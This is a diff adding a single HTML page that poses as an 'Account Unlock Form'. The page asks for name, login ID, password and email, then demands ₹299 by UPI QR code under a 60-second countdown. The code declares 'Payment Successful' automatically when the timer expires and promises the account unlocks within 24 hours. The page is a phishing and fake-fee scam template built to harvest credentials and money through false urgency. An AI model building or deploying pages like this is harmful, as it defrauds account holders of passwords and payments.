@@ -1,0 +1,93 @@
+<!DOCTYPE html><html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Account Unlock Form</title>
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+  <style>
+    .hidden { display: none; }
+  </style>
+</head>
+<body class="bg-gray-100 flex items-center justify-center min-h-screen">  <!-- Page 1: Unlock Form -->  <div id="formPage" class="bg-white p-6 rounded-lg shadow-lg w-full max-w-md">
+    <h2 class="text-2xl font-bold text-green-600 mb-4 text-center">Unlock Form</h2>
+    <form id="unlockForm">
+      <input type="text" placeholder="Full Name" class="w-full p-2 border rounded mb-3" required>
+      <input type="text" placeholder="Login ID" class="w-full p-2 border rounded mb-3" required>
+      <input type="password" placeholder="Password" class="w-full p-2 border rounded mb-3" required>
+      <input type="date" class="w-full p-2 border rounded mb-3">
+      <select class="w-full p-2 border rounded mb-3">
+        <option>Select your Gender</option>
+        <option>Male</option>
+        <option>Female</option>
+        <option>Other</option>
+      </select>
+      <input type="email" placeholder="Contact Email" class="w-full p-2 border rounded mb-3" required><p class="font-semibold text-green-600 mb-2">Select your confirmation</p>
+  <div class="mb-3 space-y-2">
+    <label class="block"><input type="checkbox"> Get a code by email</label>
+    <label class="block"><input type="checkbox"> Get a code on your phone</label>
+    <label class="block"><input type="checkbox"> Enter your date of birth</label>
+    <label class="block"><input type="checkbox"> Get a code on WhatsApp</label>
+    <label class="block"><input type="checkbox"> Confirm your identity</label>
+    <label class="block"><input type="checkbox"> No options</label>
+  </div>
+
+  <select class="w-full p-2 border rounded mb-3">
+    <option>Why was your account locked?</option>
+    <option>Hacked</option>
+    <option>Suspicious Activity</option>
+    <option>Other</option>
+  </select>
+
+  <textarea placeholder="About your account" class="w-full p-2 border rounded mb-3"></textarea>
+
+  <button type="button" onclick="goToPayment()" class="bg-green-600 text-white py-2 w-full rounded">Proceed</button>
+</form>
+
+  </div>  <!-- Page 2: Payment Page with Timer and QR -->  <div id="paymentPage" class="hidden bg-white p-6 rounded-lg shadow-lg w-full max-w-md text-center">
+    <h2 class="text-xl font-bold mb-4">Complete Your Payment</h2><div class="mb-4">
+  <p class="text-lg font-semibold mb-2">Time Remaining: <span id="countdown">01:00</span></p>
+  <img src="https://drive.google.com/uc?export=view&id=1Vg-_E_AwYTIVeCI2xjM18PtWFd0QqiVH" alt="Payment QR" class="mx-auto mb-4 rounded-lg shadow">
+  <p class="mb-2">Pay ₹299 using UPI / Paytm</p>
+  <p class="text-sm text-gray-500">Scan & Pay</p>
+</div>
+
+<button type="button" onclick="paymentDone()" class="mt-4 bg-green-600 text-white py-2 px-4 rounded">I Have Paid</button>
+
+  </div>  <!-- Page 3: Thank You Page -->  <div id="thanksPage" class="hidden bg-white p-6 rounded-lg shadow-lg w-full max-w-md text-center">
+    <h2 class="text-2xl font-bold text-green-600 mb-4">Thank You!</h2>
+    <p class="text-lg">आपका अकाउंट 24 घंटे के अंदर अपने आप अनलॉक हो जाएगा।</p>
+  </div>  <script>
+    let countdownTimer;
+
+    function goToPayment() {
+      document.getElementById('formPage').classList.add('hidden');
+      document.getElementById('paymentPage').classList.remove('hidden');
+      startCountdown(60);
+    }
+
+    function startCountdown(duration) {
+      let timer = duration, minutes, seconds;
+      countdownTimer = setInterval(function () {
+        minutes = parseInt(timer / 60, 10);
+        seconds = parseInt(timer % 60, 10);
+
+        minutes = minutes < 10 ? "0" + minutes : minutes;
+        seconds = seconds < 10 ? "0" + seconds : seconds;
+
+        document.getElementById('countdown').textContent = minutes + ":" + seconds;
+
+        if (--timer < 0) {
+          clearInterval(countdownTimer);
+          paymentDone();
+        }
+      }, 1000);
+    }
+
+    function paymentDone() {
+      clearInterval(countdownTimer);
+      document.getElementById('paymentPage').classList.add('hidden');
+      document.getElementById('thanksPage').classList.remove('hidden');
+      alert('Payment Successful! Your form has been submitted.');
+    }
+  </script></body>
+</html>
